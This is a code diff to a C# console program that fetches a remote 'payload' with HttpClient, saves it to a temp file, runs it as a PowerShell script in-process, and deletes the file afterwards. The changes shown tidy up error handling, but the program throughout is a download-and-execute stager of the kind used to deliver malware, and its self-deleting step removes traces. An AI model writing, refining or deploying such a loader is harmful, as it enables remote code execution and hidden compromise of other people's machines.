@@ -22,7 +22,7 @@ class Program
         }
         else
         {
-            Console.WriteLine("[ERROR] No payload fetched. Exiting...");
+            Console.WriteLine("[ERROR] Failed to fetch payload. Exiting...");
         }
 
         Console.WriteLine("[INFO] Execution completed. Press Enter to exit...");
@@ -33,19 +33,26 @@ class Program
     {
         try
         {
-            using (HttpClient client = new HttpClient())
-            {
-                string content = await client.GetStringAsync(url);
-                await File.WriteAllTextAsync(tempPath, content);
-                Console.WriteLine($"[SUCCESS] Payload saved at: {tempPath}");
-                return true;
-            }
+            using HttpClient client = new HttpClient();
+            string content = await client.GetStringAsync(url);
+
+            await File.WriteAllTextAsync(tempPath, content);
+            Console.WriteLine($"[SUCCESS] Payload saved at: {tempPath}");
+            return true;
+        }
+        catch (HttpRequestException ex)
+        {
+            Console.WriteLine($"[ERROR] HTTP error while fetching payload: {ex.Message}");
+        }
+        catch (IOException ex)
+        {
+            Console.WriteLine($"[ERROR] File write error: {ex.Message}");
         }
         catch (Exception ex)
         {
-            Console.WriteLine($"[ERROR] Failed to fetch payload: {ex.Message}");
-            return false;
+            Console.WriteLine($"[ERROR] Unexpected error: {ex.Message}");
         }
+        return false;
     }
 
     static void ExecutePayload(string filePath)
@@ -53,21 +60,28 @@ class Program
         try
         {
             Console.WriteLine("[INFO] Executing PowerShell script...");
-            using (PowerShell ps = PowerShell.Create())
-            {
-                string scriptContent = File.ReadAllText(filePath);
-                ps.AddScript(scriptContent);
-                var results = ps.Invoke();
 
-                Console.WriteLine("[INFO] Execution Results:");
-                foreach (var result in results)
-                {
-                    Console.WriteLine(result);
-                }
+            string scriptContent = File.ReadAllText(filePath);
+            using PowerShell ps = PowerShell.Create();
+            ps.AddScript(scriptContent);
+            var results = ps.Invoke();
+
+            Console.WriteLine("[INFO] Execution Results:");
+            foreach (var result in results)
+            {
+                Console.WriteLine(result);
             }
 
             File.Delete(filePath);
             Console.WriteLine("[INFO] Temp file deleted.");
+        }
+        catch (IOException ex)
+        {
+            Console.WriteLine($"[ERROR] File error: {ex.Message}");
+        }
+        catch (UnauthorizedAccessException ex)
+        {
+            Console.WriteLine($"[ERROR] Permission issue: {ex.Message}");
         }
         catch (Exception ex)
         {
@@ -75,6 +89,7 @@ class Program
         }
     }
 }
+
 
 
 
